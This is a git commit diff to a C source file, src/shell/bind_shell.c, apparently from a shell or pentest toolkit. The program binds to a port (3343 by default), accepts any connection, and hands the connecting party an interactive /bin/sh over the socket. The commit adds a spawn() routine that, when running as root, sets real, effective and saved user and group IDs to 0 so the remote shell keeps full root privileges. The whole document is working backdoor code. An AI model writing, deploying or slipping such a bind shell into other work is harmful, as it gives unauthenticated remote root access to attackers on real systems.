bf709680bdda4af768009bd59cbb22f2739a0a1c
leommxj <leommxj@gmail.com>
2021-07-18 14:06:38 +0800

    1.add setresuid&setresgid to shells

--- src/shell/bind_shell.c
+++ src/shell/bind_shell.c
@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -7,54 +8,61 @@
 #include <unistd.h>
 #include <netinet/in.h>
 
+char port[6] = "3343";
+char exe_path[255] = "/bin/sh";
+char exe_arg0[50] = "sh";
+
+void spawn(int fd) {
+    dup2(fd, 0);
+    dup2(fd, 1);
+    dup2(fd, 2);
+    if (geteuid() == 0){
+        setresuid(0, 0, 0);
+        setresgid(0, 0, 0);
+    }
+	execl(exe_path, exe_arg0, NULL, NULL, NULL);
+}
 
 int main(int argc, char* argv[]) {
-    int socket_fd, connect_fd;
+    int socket_fd, connect_fd, iport;
     struct sockaddr_in servaddr;
-    int n;
-    //初始化Socket
+
     if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
         printf("create socket error: %s(errno: %d)\n", strerror(errno), errno);
         exit(0);
     }
-    //初始化
-    int port = 3343;
+
     if(argc>=2){
-        port = atoi(argv[1]);
+        iport = atoi(argv[1]);
+    }else{
+        iport = atoi(port);
     }
     memset(&servaddr, 0, sizeof(servaddr));
     servaddr.sin_family = AF_INET;
-    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);//IP地址设置成INADDR_ANY,让系统自动获取本机的IP地址。
-    servaddr.sin_port = htons(port);//设置的端口为DEFAULT_PORT
+    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    servaddr.sin_port = htons(iport);
 
-    //将本地地址绑定到所创建的套接字上
     if (bind(socket_fd, (struct sockaddr *) &servaddr, sizeof(servaddr)) == -1) {
         printf("bind socket error: %s(errno: %d)\n", strerror(errno), errno);
         exit(0);
     }
-    //开始监听是否有客户端连接
+
     if (listen(socket_fd, 10) == -1) {
         printf("listen socket error: %s(errno: %d)\n", strerror(errno), errno);
         exit(0);
     }
 
     while (1) {
-        //阻塞直到有客户端连接，不然多浪费CPU资源。
         if ((connect_fd = accept(socket_fd, (struct sockaddr *) NULL, NULL)) == -1) {
             printf("accept socket error: %s(errno: %d)", strerror(errno), errno);
             exit(0);
         }
-        char *argv[2] = {"sh", NULL};
         int pid = fork();
         if(pid == -1) {
             exit(0);
         }
         if (!pid) {
-            dup2(connect_fd, 0);
-            dup2(connect_fd, 1);
-            dup2(connect_fd, 2);
-            //execve("/bin/sh", argv, __environ);
-	    execl("/bin/sh","sh",NULL,NULL,NULL);
+            spawn(connect_fd);
             exit(0);
         }
         close(connect_fd);
